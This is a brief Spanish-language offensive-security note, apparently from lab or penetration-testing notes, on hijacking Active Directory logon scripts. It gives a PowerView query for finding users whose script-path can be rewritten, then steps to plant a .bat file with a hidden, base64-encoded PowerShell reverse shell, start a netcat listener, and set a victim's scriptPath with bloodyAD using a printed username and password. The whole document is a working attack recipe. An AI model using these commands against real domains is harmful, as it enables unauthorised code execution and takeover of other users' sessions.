# Info

Los scripts de inicio de sesión en Active Directory permiten ejecutar tareas de manera automática al momento en que un usuario inicia sesión.

# Requisitos

- Tener permiso de escritura en las carpetas NETLOGON o SYSVOL del DC o sobre una carpeta en la máquina donde se baya a conectar el usuario.
- Tener permisos de escritura del script-path de un usuario

# Explotación
Buscar ususarios sobre los que nuestro usuario puede reescribirle el el script-path

    $UserSID = (Get-DomainUser -Identity "user").objectSID
    Get-DomainObjectAcl -Identity * -ResolveGUIDs |  Where-Object { $_.SecurityIdentifier -eq $UserSID -and $_.ObjectAceType -like "Script-Path" } | Select-Object ObjectDN, ObjectAceType

## Abuso

1) Crear un archivo .bat con una shell reversa en base64 de revshells agregando antes del base64

        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <base64>
2) Lo subimos a la carpeta del smb
3) Iniciamos un nc
4) actualzamos el script-path de la víctima

        bloodyAD --host "10.129.229.224" -d "inlanefreight.local" -u "david" -p 'SecurePassDav!d5' set object eric scriptPath -v 'ruta/al/archivo.bat'
5) Esperamos a que el usuario inicie la sesión.
